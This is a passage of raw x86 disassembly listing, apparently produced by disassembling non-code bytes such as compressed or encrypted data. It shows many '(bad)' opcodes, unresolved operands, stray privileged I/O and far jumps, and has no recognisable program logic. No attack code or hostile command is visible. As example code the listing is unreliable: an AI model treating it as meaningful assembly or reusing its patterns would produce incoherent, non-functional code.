  415bfd:	adc    eax,0xf9b24d95
  415c02:	or     DWORD PTR [esi],eax
  415c04:	rcl    DWORD PTR [ecx+0x1dae8f0e],0xec
  415c0b:	jb     0x415b8e
  415c0d:	shl    BYTE PTR [edi+0x4b],1
  415c10:	clc    
  415c11:	dec    edi
  415c12:	pushf  
  415c13:	enter  0xea4,0x5e
  415c17:	adc    ah,BYTE PTR [esp+ebp*2+0x31]
  415c1b:	int    0xc7
  415c1d:	mov    edi,0x7f07a7e2
  415c22:	or     al,0xde
  415c24:	xchg   ebp,eax
  415c25:	add    BYTE PTR [edx+0x78],bh
  415c28:	popa   
  415c29:	not    BYTE PTR [edx+0x30f14da9]
  415c2f:	jnp    0x415bc8
  415c31:	test   eax,0x5c47ed77
  415c36:	dec    esi
  415c37:	mul    cl
  415c39:	jno    0x415c47
  415c3b:	mov    al,0x14
  415c3d:	sub    BYTE PTR [edi+0x30],cl
  415c40:	lahf   
  415c41:	cmp    ebp,esp
  415c43:	add    eax,0xaffb65c6
  415c48:	(bad)  
  415c49:	cmp    cl,BYTE PTR [edi]
  415c4b:	jecxz  0x415cb0
  415c4d:	ins    BYTE PTR es:[edi],dx
  415c4e:	and    DWORD PTR [edi+ebp*8+0x5081195e],0x752d69c
  415c59:	xor    ecx,edi
  415c5b:	add    dl,BYTE PTR [ecx]
  415c5d:	data16 sbb BYTE PTR [edi-0x2efacc68],dh
  415c64:	inc    esi
  415c65:	inc    eax
  415c66:	pop    ss
  415c67:	sub    al,0xec
  415c69:	lods   eax,DWORD PTR ds:[esi]
  415c6a:	and    ebx,DWORD PTR [esi]
  415c6c:	jnp    0x415c73
  415c6e:	imul   BYTE PTR es:[ebx]
  415c71:	div    BYTE PTR gs:[ecx-0x7814c5e6]
  415c78:	sbb    eax,0x2b625bb8
  415c7d:	and    edx,DWORD PTR [esi-0x16796d48]
  415c83:	out    0x26,al
  415c85:	inc    edx
  415c86:	or     eax,0xac9ba41e
  415c8b:	jnp    0x415c8e
  415c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c8e:	out    dx,eax
  415c8f:	or     BYTE PTR cs:[ebp+0x4d],bh
  415c93:	pop    esp
  415c94:	fbld   TBYTE PTR [edi-0x9b8110]
  415c9a:	push   ds
  415c9b:	fwait
  415c9c:	sbb    eax,0xcf6e9ce6
  415ca1:	ins    DWORD PTR es:[edi],dx
  415ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca3:	and    DWORD PTR ds:0xa855f5ab,eax
  415ca9:	mov    ch,0xa3
  415cab:	lahf   
  415cac:	repz sbb al,0x4a
  415caf:	fcomp  QWORD PTR [ebx-0x52c81275]
  415cb5:	pushf  
  415cb6:	out    dx,al
  415cb7:	sbb    al,0x32
  415cb9:	sahf   
  415cba:	inc    dx
  415cbc:	call   0xe89f:0xd02f2437
  415cc3:	repz rol BYTE PTR ds:0x94de02c,cl
  415cca:	pop    ss
  415ccb:	sub    al,BYTE PTR [edi+0x11e03000]
  415cd1:	push   esi
  415cd2:	jecxz  0x415c67
  415cd4:	fcom   DWORD PTR [ebx+0x54]
  415cd7:	stos   DWORD PTR es:[edi],eax
  415cd8:	pop    es
  415cd9:	add    dh,cl
  415cdb:	mul    BYTE PTR [esi-0x36]
  415cde:	loop   0x415c61
  415ce0:	retf   
  415ce1:	and    dl,BYTE PTR [eax]
  415ce3:	rol    DWORD PTR [esi+ebp*1],cl
  415ce6:	fistp  WORD PTR [ebx+0x6349ac22]
  415cec:	pop    es
  415ced:	push   ecx
  415cee:	popf   
  415cef:	xlat   BYTE PTR ds:[ebx]
  415cf0:	enterw 0x71c5,0x9e
  415cf5:	stc    
  415cf6:	adc    dh,BYTE PTR [eax-0x61289bbc]
  415cfc:	push   eax
  415cfd:	leave  
  415cfe:	neg    DWORD PTR [esp+edx*8-0x60]
  415d02:	xchg   esi,eax
  415d03:	or     eax,0x57dade4
  415d08:	fwait
  415d09:	xor    edx,edi
  415d0b:	or     cl,BYTE PTR [eax+0x78]
  415d0e:	xchg   edx,eax
  415d0f:	daa    
  415d10:	pop    edx
  415d11:	fmul   QWORD PTR [ebp-0x1132cc9c]
  415d17:	out    0x9a,al
  415d19:	dec    esi
  415d1a:	ffree  st(5)
  415d1c:	xor    eax,0xb7dc3654
  415d21:	mov    ebx,0x7500da96
  415d26:	jbe    0x415cb6
  415d28:	inc    ebx
  415d29:	in     al,dx
  415d2a:	jae    0x415cf1
  415d2c:	mov    ?,esi
  415d2e:	jmp    0x2f612c37
  415d33:	leave  
  415d34:	addr16 xor eax,0x73e8d0b5
  415d3a:	xchg   ebx,eax
  415d3b:	adc    BYTE PTR [eax-0x1c],ah
  415d3e:	adc    DWORD PTR [edi-0x35],esi
  415d41:	mov    bh,0x79
  415d43:	mov    cl,0xba
  415d45:	mov    ecx,0x73d7ad76
  415d4a:	push   edi
  415d4b:	fwait
  415d4c:	dec    ebp
  415d4d:	mov    edx,ebp
  415d4f:	xor    BYTE PTR ds:0x9686e009,dl
  415d55:	mov    edx,0xe4fa3685
  415d5a:	imul   DWORD PTR ds:0xa7e133ce
  415d60:	pop    ds
  415d61:	pop    esi
  415d62:	pop    ss
  415d63:	ja     0x415da9
  415d65:	jns    0x415cf5
  415d67:	in     al,0x16
  415d69:	dec    esp
  415d6a:	sbb    al,0xc2
  415d6c:	ds xchg edi,eax
  415d6e:	sti    
  415d6f:	pop    edx
  415d70:	mov    ecx,0x27a52ff4
  415d75:	outs   dx,BYTE PTR ds:[esi]
  415d76:	xor    al,ch
  415d78:	add    eax,0x88718599
  415d7d:	jns    0x415d6e
  415d7f:	mov    dl,0x2d
  415d81:	sub    BYTE PTR [edi-0x7fb40d64],cl
  415d87:	jl     0x415ddf
  415d89:	ret    
  415d8a:	push   esp
  415d8b:	and    eax,0x788e0613
  415d90:	loope  0x415ddf
  415d92:	loop   0x415d4b
  415d94:	jle    0x415d62
  415d96:	loope  0x415dab
  415d98:	fild   DWORD PTR [edx-0x45]
  415d9b:	retf   
  415d9c:	mov    esi,0x773c3aea
  415da1:	and    al,0x17
  415da3:	sub    BYTE PTR ds:0xf9fca58d,0x3c
  415daa:	push   ecx
  415dab:	or     DWORD PTR [ebx-0x718993fd],ebx
  415db1:	mov    ebp,0x660760a
  415db6:	lods   al,BYTE PTR ds:[esi]
  415db7:	mov    ah,0x37
  415db9:	inc    ecx
  415dba:	inc    ebp
  415dbb:	ja     0x415d40
  415dbd:	out    0x75,eax
  415dbf:	adc    BYTE PTR [ecx+0x77],ch
  415dc2:	push   0xa29c576b
  415dc7:	mov    ds:0x7ab2576d,al
  415dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dcd:	and    bh,cl
  415dcf:	fisttp DWORD PTR [ebx+0x74]
  415dd2:	inc    edx
  415dd3:	lds    edx,FWORD PTR [eax]
  415dd5:	enter  0x5ad6,0x3b
  415dd9:	pop    ds
  415dda:	lds    edx,FWORD PTR [edi]
  415ddc:	mov    esi,0x17b2f6d6
  415de1:	arpl   WORD PTR [ebx-0x1a697bc3],sp
  415de7:	dec    ebp
  415de8:	pop    esp
  415de9:	adc    BYTE PTR cs:[esp+ebx*1+0x2318683a],cl
  415df1:	scas   eax,DWORD PTR es:[edi]
  415df2:	push   esp
  415df3:	and    esi,DWORD PTR [ebx+0x21732598]
  415df9:	loope  0x415e01
  415dfb:	adc    BYTE PTR [edi],ah
  415dfd:	xchg   ecx,eax
  415dfe:	aad    0xa1
  415e00:	ins    BYTE PTR es:[edi],dx
  415e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e02:	das    
  415e03:	sub    bh,0xad
  415e06:	frstor [ebp-0x77]
  415e09:	rcr    BYTE PTR [ebp+0x5a],cl
  415e0c:	cmp    BYTE PTR [ecx+0x2d],bl
  415e0f:	pop    es
  415e10:	mov    dh,0x36
  415e12:	inc    ebx
  415e13:	jle    0x415e70
  415e15:	iret   
  415e16:	add    DWORD PTR [esi+eiz*1],edi
  415e19:	mov    esi,0x8d2a9c24
  415e1e:	pop    edi
  415e1f:	ins    DWORD PTR es:[edi],dx
  415e20:	popf   
  415e21:	xor    al,0x68
  415e23:	sub    al,0x5
  415e25:	lock ja 0x415db9
  415e28:	jp     0x415e5d
  415e2a:	mov    eax,0x1ca52526
  415e2f:	dec    ecx
  415e30:	adc    eax,0xc6f1c913
  415e35:	push   esi
  415e36:	enter  0xe1b,0x99
  415e3a:	aam    0x2c
  415e3c:	mov    gs,WORD PTR [edx-0x201915fa]
  415e42:	loope  0x415ea7
  415e44:	fmul   QWORD PTR [edi]
  415e46:	lock ins BYTE PTR es:[edi],dx
  415e48:	(bad)  
  415e49:	and    dh,al
  415e4b:	or     al,0xc8
  415e4d:	add    al,0x75
  415e4f:	aam    0xe6
  415e51:	push   esp
  415e52:	add    DWORD PTR [ebx-0x25],0x384c115f
  415e59:	inc    esi
  415e5a:	mov    dh,bl
  415e5c:	in     al,dx
  415e5d:	lea    edx,[edi+ebp*1-0x15]
  415e61:	nop
  415e62:	adc    eax,0xbff3d267
  415e67:	fsubr  st(7),st
  415e69:	and    BYTE PTR es:[edi],dh
  415e6c:	mov    ds:0x32647fcf,eax
  415e71:	lock push ebp
  415e73:	out    dx,eax
  415e74:	xchg   ebx,eax
  415e75:	lock or DWORD PTR [ecx+ebp*8-0x1b1b9df8],edx
  415e7d:	clc    
  415e7e:	cwde   
  415e7f:	out    dx,eax
  415e80:	gs sbb eax,0xc75e581c
  415e86:	pop    ecx
  415e87:	ins    DWORD PTR es:[edi],dx
  415e88:	pop    es
  415e89:	(bad)  
  415e8a:	jmp    0xa294:0xf8e7881e
  415e91:	inc    eax
  415e92:	sub    ebx,DWORD PTR [edi+esi*8+0x16]
  415e96:	sub    BYTE PTR [esp+ecx*4],bl
  415e99:	mov    al,0xe7
  415e9b:	out    0xac,eax
  415e9d:	jmp    0x415ea1
  415e9f:	mov    ebp,0x5712351f
  415ea4:	rcl    DWORD PTR [esi-0x69],0x9f
  415ea8:	imul   ebx,DWORD PTR [eax+0x374826d6],0x392e8a3a
  415eb2:	xchg   ebx,eax
  415eb3:	out    dx,eax
  415eb4:	inc    eax
  415eb5:	mov    edx,0x85cc7f03
  415eba:	fist   DWORD PTR [edx-0xd]
  415ebd:	daa    
  415ebe:	fnsave [edx+0x3]
  415ec1:	stos   DWORD PTR es:[edi],eax
  415ec2:	(bad)  
  415ec3:	(bad)  
  415ec4:	fst    st(4)
  415ec6:	aas    
  415ec7:	imul   DWORD PTR [edi+0x7e]
  415eca:	aas    
  415ecb:	mov    bh,al
  415ecd:	(bad)  
  415ece:	or     ecx,DWORD PTR [ebp-0x4d]
  415ed1:	mov    WORD PTR [edx-0x6fd6afa8],?
  415ed7:	stos   BYTE PTR es:[edi],al
  415ed8:	sbb    DWORD PTR [edi+0x77],0x9707e50c
  415edf:	retf   0xcdec
  415ee2:	out    dx,eax
  415ee3:	(bad)  
  415ee4:	and    al,0x1b
  415ee6:	push   eax
  415ee7:	xlat   BYTE PTR ds:[ebx]
  415ee8:	pop    esp
  415ee9:	add    ebp,ebx
  415eeb:	fimul  DWORD PTR ds:0xd0ab46db
  415ef1:	(bad)  
  415ef2:	cmc    
  415ef3:	les    eax,FWORD PTR [edi+0x6c706315]
  415ef9:	dec    ecx
  415efa:	dec    esp
  415efb:	(bad)  
  415efc:	fld    TBYTE PTR [esi+0x5d]
  415eff:	(bad)  
  415f01:	adc    ebp,DWORD PTR [ecx+edi*1-0x4c]
  415f05:	mov    dl,0xe8
  415f07:	addr16 call 0x5aa41ba4
  415f0d:	mov    eax,0x5c7a73ef
  415f12:	mov    bh,0x70
  415f14:	(bad)  
  415f15:	push   ebp
  415f16:	inc    ebp
  415f17:	push   ss
  415f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f19:	adc    ebp,esi
  415f1b:	sub    DWORD PTR ds:0x433f7517,ebp
  415f21:	cwde   
  415f22:	pop    ebx
  415f23:	xor    BYTE PTR [edi+eax*2-0x7d],ah
  415f27:	push   esi
  415f28:	adc    al,0x8
  415f2a:	jmp    FWORD PTR [esi-0x63]
  415f2d:	sbb    DWORD PTR [edx],ecx
  415f2f:	outs   dx,DWORD PTR ds:[esi]
  415f30:	pushf  
  415f31:	in     eax,dx
  415f32:	jb     0x415f22
  415f34:	mov    ch,0x4e
  415f36:	jp     0x415f8d
  415f38:	call   0x6e058a13
  415f3d:	jl     0x415fa0
  415f3f:	(bad)  
  415f40:	jecxz  0x415fab
  415f42:	gs mov eax,0x6541d3cb
  415f48:	jo     0x415f9e
  415f4a:	push   edi
  415f4b:	xchg   ebp,eax
  415f4c:	mov    esp,0xc3b5f718
  415f51:	sub    DWORD PTR [edx-0x51a1cca6],ecx
  415f57:	adc    al,0x6e
  415f59:	ret    0xf891
  415f5c:	sbb    eax,0xdfd4f55d
  415f61:	retf   
  415f62:	jg     0x415f0d
  415f64:	iret   
  415f65:	in     eax,dx
  415f66:	lahf   
  415f67:	scas   eax,DWORD PTR es:[di]
  415f69:	sbb    ebp,eax
  415f6b:	and    ebp,DWORD PTR [ecx+0x4515cd62]
  415f71:	sbb    al,0x25
  415f73:	jge    0x415faa
  415f75:	inc    edi
  415f76:	aam    0x9e
  415f78:	dec    eax
  415f79:	data16 xor ch,BYTE PTR [ebp-0x41]
  415f7d:	dec    esi
  415f7e:	call   0x3c7c:0x31ccbf75
  415f85:	jmp    0x415fb9
  415f87:	xchg   edx,eax
  415f88:	adc    bl,BYTE PTR [ecx-0x3c]
  415f8b:	cmp    DWORD PTR [ebx+edi*2],0xe363f37e
  415f92:	inc    esi
  415f93:	rcr    DWORD PTR [ebx-0x4d8f84d7],1
  415f99:	and    al,0x68
  415f9b:	out    0xca,al
  415f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f9e:	int    0x3c
  415fa0:	inc    ebp
  415fa1:	push   esi
  415fa2:	cdq    
  415fa3:	jg     0x415f27
  415fa5:	cmp    al,bh
  415fa7:	pushf  
  415fa8:	(bad)  
  415fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415faa:	and    bh,bh
  415fac:	or     al,0xbd
  415fae:	mov    ch,0xb4
  415fb0:	push   dx
  415fb2:	sbb    eax,DWORD PTR [ecx]
  415fb4:	sti    
  415fb5:	int3   
  415fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb7:	fwait
  415fb8:	stc    
  415fb9:	or     BYTE PTR [ebp+0x68785c5f],bh
  415fbf:	nop
  415fc0:	fiadd  WORD PTR [edx+0x5c5c6806]
  415fc6:	jp     0x415f68
  415fc8:	adc    al,0x41
  415fca:	mov    al,ds:0xf3fa6e67
  415fcf:	mov    ch,dl
  415fd1:	pop    ds
  415fd2:	or     edx,DWORD PTR [edx+0x47e4c5bf]
  415fd8:	leave  
  415fd9:	sbb    ecx,ebp
  415fdb:	mov    edx,0x4a3306aa
  415fe0:	retf   
  415fe1:	pusha  
  415fe2:	loope  0x41604e
  415fe4:	imul   eax,ecx,0x427bfd09
  415fea:	aad    0x1e
  415fec:	jmp    0x926d:0x9843eea7
  415ff3:	ins    DWORD PTR es:[edi],dx
  415ff4:	pusha  
  415ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ff6:	and    al,0x92
  415ff8:	popa   
  415ff9:	jb     0x415fc4
  415ffb:	inc    ecx
  415ffc:	loopne 0x415fcd
  415ffe:	mov    ch,0xc9
  416000:	cld    
  416001:	pop    esp
  416002:	fdivrp st(2),st
  416004:	adc    al,0x2b
  416006:	out    dx,al
  416007:	neg    DWORD PTR [eax]
  416009:	push   0xffffffb8
  41600b:	ja     0x41603e
  41600d:	sub    al,0x7c
  41600f:	int    0x68
  416011:	into   
  416012:	pop    ss
  416013:	mov    bl,0xf9
  416015:	ror    BYTE PTR [eax+0x2a],cl
  416018:	les    edi,FWORD PTR [ebx]
  41601a:	fimul  WORD PTR [ecx+0x25]
  41601d:	hlt    
  41601e:	daa    
  41601f:	adc    esp,DWORD PTR [ecx]
  416021:	retf   
  416022:	sbb    al,0x4
  416024:	mov    bl,0xf0
  416026:	push   ebx
  416027:	or     edi,DWORD PTR [edi-0xc]
  41602a:	jno    0x416007
  41602c:	jge    0x41607d
  41602e:	cwde   
  41602f:	cdq    
  416030:	(bad)  
  416031:	nop
  416032:	and    ecx,esi
  416034:	push   ebp
  416035:	mov    edx,gs
  416037:	xchg   esi,eax
  416038:	and    eax,0x562d7b5f
  41603d:	aas    
  41603e:	into   
  41603f:	in     al,dx
  416040:	sti    
  416041:	nop
  416042:	xor    al,0x68
  416044:	leave  
  416045:	shr    edi,1
  416047:	ins    BYTE PTR es:[edi],dx
  416048:	jg     0x416042
  41604a:	mov    BYTE PTR [ebp-0x232a4989],ch
  416050:	int    0xac
  416052:	mov    dl,0xf0
  416054:	xor    ah,dl
  416056:	dec    edi
  416057:	and    esi,DWORD PTR [ebx]
  416059:	xor    al,0xfd
  41605b:	and    ah,dh
  41605d:	stos   DWORD PTR es:[edi],eax
  41605e:	lods   eax,DWORD PTR ds:[esi]
  41605f:	in     al,dx
  416060:	call   0x8776905
  416065:	(bad)  
  416066:	jno    0x415fff
  416068:	sbb    DWORD PTR [ebx-0x67],eax
  41606b:	test   dh,al
  41606d:	shl    BYTE PTR [eax-0x5598de5b],1
  416073:	into   
  416074:	add    BYTE PTR [edx],cl
  416076:	adc    ebx,esp
  416078:	mov    ebx,0x79fad015
  41607d:	ret    
  41607e:	pop    es
  41607f:	pop    ds
  416080:	inc    edi
  416081:	xchg   ebp,eax
  416082:	ret    
  416083:	sub    bl,BYTE PTR [ecx]
  416085:	xor    eax,0x889749dd
  41608a:	arpl   bx,si
  41608c:	xchg   edi,eax
  41608d:	pop    eax
  41608e:	mov    ebp,0xfa111d1a
  416093:	test   DWORD PTR ds:0xbf4365cd,ebp
  416099:	shl    DWORD PTR [edx+0x3a591a2b],cl
  41609f:	shr    BYTE PTR [edi-0x1080f470],1
  4160a5:	mov    ds:0x899933bd,al
  4160aa:	xchg   ebx,eax
  4160ab:	rcl    BYTE PTR [ebx+0x4f],1
  4160ae:	loopne 0x4160c1
  4160b0:	mov    ecx,0x87bc215f
  4160b5:	or     esp,DWORD PTR [eax+0x43]
  4160b8:	mul    BYTE PTR [edx-0x510ba5aa]
  4160be:	add    ebx,DWORD PTR [esi]
  4160c0:	rcl    DWORD PTR [edx-0x76],1
  4160c3:	int3   
  4160c4:	xor    ebp,ebx
  4160c6:	mov    eax,ds:0xb5ba8fd7
  4160cb:	arpl   bx,si
  4160cd:	sub    al,0xa6
  4160cf:	mov    ds:0x6516f88f,eax
  4160d4:	loop   0x416068
  4160d6:	icebp  
  4160d7:	mov    ds:0x51c61c1c,eax
  4160dc:	xchg   BYTE PTR ds:0x7f374b40,dl
  4160e2:	ds ds sbb eax,0xfc7432df
  4160e9:	pop    eax
  4160ea:	lods   eax,DWORD PTR ds:[esi]
  4160eb:	or     bh,cl
  4160ed:	jnp    0x4160ab
  4160ef:	jns    0x41611e
  4160f1:	push   ebp
  4160f2:	mov    ds:0x91487e9a,eax
  4160f7:	xchg   edx,eax
  4160f8:	repz mov esp,0x56c1c72f
  4160fe:	in     al,dx
  4160ff:	add    al,0xa1
  416101:	pmullw mm2,QWORD PTR [ebx-0x52]
  416105:	push   ebp
  416106:	cmc    
  416107:	adc    eax,0xe4a30400
  41610c:	xor    BYTE PTR ds:0xd0d01825,ch
  416112:	loopne 0x4160d3
  416114:	mov    ds:0xb409a72,eax
  416119:	mov    ds:0x81376917,al
  41611e:	ret    
  41611f:	addr16 std 
  416121:	and    eax,0x476a5c14
  416126:	xchg   BYTE PTR [ebp-0x28c1fe5c],dl
  41612c:	pop    ss
  41612d:	loop   0x4161ad
  41612f:	mov    ecx,0xb6ff8640
  416134:	mov    ch,0x2d
  416136:	xchg   DWORD PTR [edi],ecx
  416138:	mov    ch,0x63
  41613a:	xor    al,0xf4
  41613c:	cmp    ecx,eax
  41613e:	or     eax,0x53c181ce
  416143:	or     DWORD PTR [ebx],edx
  416145:	loop   0x416130
  416147:	inc    ebp
  416148:	xchg   ebp,eax
  416149:	xchg   ecx,eax
  41614a:	push   0xffffff98
  41614c:	ins    DWORD PTR es:[edi],dx
  41614d:	dec    ebx
  41614e:	jmp    0xaa98cfdd
  416153:	std    
  416154:	mov    esp,0x9947a5f1
  416159:	mov    al,0xd7
  41615b:	ss scas al,BYTE PTR es:[edi]
  41615d:	inc    edx
  41615e:	inc    edx
  41615f:	inc    edx
  416160:	dec    edi
  416161:	test   eax,0xedd80c91
  416166:	sbb    BYTE PTR [edi],cl
  416168:	out    0x18,eax
  41616a:	mov    ebp,0xfa9afab6
  41616f:	sbb    ebx,DWORD PTR ss:[ebx+0x1f]
  416173:	ja     0x4161d1
  416175:	jbe    0x416131
  416177:	cli    
  416178:	jbe    0x416112
  41617a:	(bad)  
  41617b:	in     al,0x13
  41617d:	shl    DWORD PTR [ebx+ebx*4+0x2d],1
  416181:	out    dx,eax
  416182:	pop    esi
  416183:	and    DWORD PTR [ecx+ecx*4+0x733e6d78],edx
  41618a:	add    DWORD PTR [ecx+0x17ea2b47],0x37
  416191:	in     eax,0xf1
  416193:	or     eax,edx
  416195:	hlt    
  416196:	pop    edx
  416197:	inc    ecx
  416198:	lods   eax,DWORD PTR ds:[esi]
  416199:	test   ch,bh
  41619b:	cmp    dh,ch
  41619d:	(bad)  
  41619e:	xchg   esp,eax
  41619f:	enter  0x4d35,0xeb
  4161a3:	or     eax,0x7102d148
  4161a8:	call   0x24c57f7b
  4161ad:	push   0xfffffff6
  4161af:	int    0x73
  4161b1:	mov    dl,BYTE PTR [ebx]
  4161b3:	leave  
  4161b4:	adc    eax,0xa431b53b
  4161b9:	or     ecx,DWORD PTR [ebp+0x77]
  4161bc:	rcr    BYTE PTR [edx+0x57126636],0x61
  4161c3:	and    al,0x99
  4161c5:	dec    edx
  4161c6:	push   es
  4161c7:	sub    dh,BYTE PTR [ebx-0x1a]
  4161ca:	fcomp  DWORD PTR [ebp+eiz*2+0x19]
  4161ce:	les    ecx,FWORD PTR [edx-0x55c84a35]
  4161d4:	(bad)  
  4161d5:	push   ecx
  4161d6:	in     eax,0xf8
  4161d8:	adc    al,0xc2
  4161da:	dec    ebx
  4161db:	adc    eax,0x89b320a9
  4161e0:	sbb    eax,0x3a900d26
  4161e5:	enter  0xb9cc,0x4e
  4161e9:	ins    DWORD PTR es:[edi],dx
  4161ea:	dec    ebx
  4161eb:	xchg   DWORD PTR [edx-0x7],edx
  4161ee:	ret    
  4161ef:	div    BYTE PTR [edx+0x74]
  4161f2:	stc    
  4161f3:	rcr    DWORD PTR [esi],cl
  4161f5:	aas    
  4161f6:	and    BYTE PTR [edi-0x6a0c87d7],dh
  4161fc:	mov    ecx,0xd687629c
  416201:	in     al,0x6
  416203:	dec    eax
  416204:	jmp    0xa13120e4
  416209:	ins    DWORD PTR es:[edi],dx
  41620a:	rcl    BYTE PTR [edi+edx*4],1
  41620d:	add    DWORD PTR [eax+0x45],edi
  416210:	adc    al,0x9e
  416212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416213:	add    ebx,DWORD PTR [ecx+0x488b15f0]
  416219:	inc    ecx
  41621a:	scas   al,BYTE PTR es:[edi]
  41621b:	mov    dh,0x8b
  41621d:	pop    ss
  41621e:	sub    al,0x2
  416220:	or     BYTE PTR [ebx+0x1a760a1e],al
  416226:	mov    ds:0x6c7e48c6,eax
  41622b:	push   eax
  41622c:	mov    dh,0x69
  41622e:	ds (bad) 
  416230:	jnp    0x4161ed
  416232:	adc    BYTE PTR [ebp+0x2],al
  416235:	hlt    
  416236:	xlat   BYTE PTR ds:[ebx]
  416237:	lods   al,BYTE PTR ds:[esi]
  416238:	xchg   edx,eax
  416239:	(bad)  
  41623d:	cmc    
  41623e:	push   ebp
  41623f:	jl     0x416278
  416241:	lods   eax,DWORD PTR ds:[esi]
  416242:	or     bl,BYTE PTR [ecx]
  416244:	in     al,0x97
  416246:	cwde   
  416247:	jae    0x4161ff
  416249:	push   ds
  41624a:	mov    ecx,0x6f021943
  41624f:	jbe    0x416296
  416251:	cld    
  416252:	stc    
  416253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416254:	xlat   BYTE PTR ds:[ebx]
  416255:	jg     0x41624c
  416257:	dec    edi
  416258:	cmp    BYTE PTR [ecx+edi*2-0x5336387a],bl
  41625f:	lds    esi,FWORD PTR [ebp+0x74]
  416262:	push   esi
  416263:	cmc    
  416264:	add    al,0x77
  416266:	shr    bl,cl
  416268:	mov    ds:0xa460ca49,eax
  41626d:	add    DWORD PTR ds:0xc136209a,ecx
  416273:	add    eax,0x5ba98ca3
  416278:	add    ch,BYTE PTR [ecx-0xf]
  41627b:	inc    esi
  41627c:	stc    
  41627d:	mov    BYTE PTR [esp+edx*8+0x1e],dl
  416281:	inc    esi
  416282:	pop    es
  416283:	scas   al,BYTE PTR es:[edi]
  416284:	sub    eax,0x164ca662
  416289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41628a:	xor    esi,0xef85917a
  416290:	test   DWORD PTR [edi-0x6c],ebp
  416293:	dec    ebp
  416294:	sub    eax,DWORD PTR [ebp+0x7d95e53a]
  41629a:	shl    BYTE PTR [esi-0x5d],1
  41629d:	inc    eax
  41629e:	movhlps xmm2,xmm5
  4162a1:	jnp    0x4162ec
  4162a3:	div    DWORD PTR [edx]
  4162a5:	adc    dh,BYTE PTR [eax+0x7f]
  4162a8:	jbe    0x416252
  4162aa:	loopne 0x4162b7
  4162ac:	add    BYTE PTR [ebx+eax*1+0x7c],bh
  4162b0:	in     eax,0x3d
  4162b2:	lahf   
  4162b3:	pop    edi
  4162b4:	ret    
  4162b5:	test   al,0x2d
  4162b7:	sub    al,0x34
  4162b9:	je     0x41623f
  4162bb:	jns    0x416292
  4162bd:	mov    esp,0x3e2bec3f
  4162c2:	mov    ebp,0xb5674326
  4162c7:	sbb    al,0x6a
  4162c9:	icebp  
  4162ca:	rcl    bh,0x8d
  4162cd:	pop    ecx
  4162ce:	jo     0x41632d
  4162d0:	xchg   edi,eax
  4162d1:	sub    eax,0x14624d0f
  4162d6:	push   ecx
  4162d7:	dec    ecx
  4162d8:	push   cs
  4162d9:	imul   edx,DWORD PTR [eax+eax*8-0x2a28cd28],0x50776612
  4162e4:	and    al,0x60
  4162e6:	js     0x4162fa
  4162e8:	push   esi
  4162e9:	ror    DWORD PTR [ebp-0x386ade5c],0x8c
  4162f0:	int    0x1
  4162f2:	and    BYTE PTR gs:[esi+0x4e],0xc6
  4162f7:	je     0x4162fc
  4162f9:	dec    ebp
  4162fa:	xor    DWORD PTR [ecx+0x1b],esi
  4162fd:	add    ebp,DWORD PTR [edx-0x73]
  416300:	imul   eax,ebp,0x13
  416303:	in     al,dx
  416304:	mov    eax,ds:0x71a1b2a4
  416309:	mov    ebp,0xc3ffbe3b
  41630e:	jo     0x4162cd
  416310:	sub    BYTE PTR [ebx-0x61],0x99
  416314:	ins    BYTE PTR es:[edi],dx
  416315:	jb     0x416396
  416317:	or     esi,DWORD PTR [eax]
  416319:	or     eax,0x1e8b6042
  41631e:	leave  
  41631f:	mov    ds:0x52ec7e5a,eax
  416324:	retf   
  416325:	or     dl,cl
  416327:	pop    esi
  416328:	mov    esi,ebp
  41632a:	mov    edi,0x74f91717
  41632f:	jae    0x416314
  416331:	in     eax,0x68
  416333:	xchg   ebx,eax
  416334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416335:	mov    dl,BYTE PTR [edx+0x7f3c6295]
  41633b:	fstp   st(2)
  41633d:	(bad)  
  41633e:	xor    ax,0x4cfd
  416342:	push   esi
  416343:	cmp    eax,0x157aaaf6
  416348:	pop    ds
  416349:	mov    al,0xea
  41634b:	mov    al,ds:0xe1338c49
  416350:	mov    ebp,0x2e655e70
  416355:	jb     0x416398
  416357:	mov    eax,ds:0xa2bcf26f
  41635c:	inc    ebx
  41635d:	xchg   ebx,eax
  41635e:	jmp    0xde90:0xcd636185
  416365:	push   ecx
  416366:	mov    eax,es:0x33cc2681
  41636c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41636d:	sub    eax,ecx
  41636f:	add    esp,DWORD PTR [ebp-0x633eba55]
  416375:	(bad)  
  416376:	fsub   DWORD PTR [ebx-0x28]
  416379:	add    bl,BYTE PTR [esi]
  41637b:	add    BYTE PTR [edi+0x65],0x2e
  41637f:	or     DWORD PTR [eax],0xd433c3d1
  416385:	(bad)  
  416386:	stc    
  416387:	shl    DWORD PTR [ebp-0x721bae31],cl
  41638d:	stos   BYTE PTR es:[edi],al
  41638e:	and    eax,0xff85601b
  416393:	mov    al,ds:0xaf09bfe3
  416398:	neg    BYTE PTR [esp+eiz*4-0x61]
  41639c:	repz mov ch,0x5e
  41639f:	dec    ebx
  4163a0:	das    
  4163a1:	sbb    DWORD PTR [ecx-0x63],0x5b
  4163a5:	push   0x5f3b325d
  4163aa:	ret    
  4163ab:	out    dx,al
  4163ac:	stc    
  4163ad:	pushf  
  4163ae:	push   ss
  4163af:	pop    esi
  4163b0:	pop    esp
  4163b1:	bound  esp,QWORD PTR [edi+edi*2]
  4163b4:	cmp    ah,ah
  4163b6:	sbb    BYTE PTR ds:0x9ef53741,ch
  4163bc:	add    DWORD PTR [eax+0x43],edx
  4163bf:	rol    dh,1
  4163c1:	shr    DWORD PTR [ebx+0x5ed6271d],cl
  4163c7:	or     esi,DWORD PTR [ebx-0x59]
  4163ca:	aad    0xe8
  4163cc:	fisubr WORD PTR [ebx-0x5d]
  4163cf:	cmp    DWORD PTR [ecx+ebx*4],edx
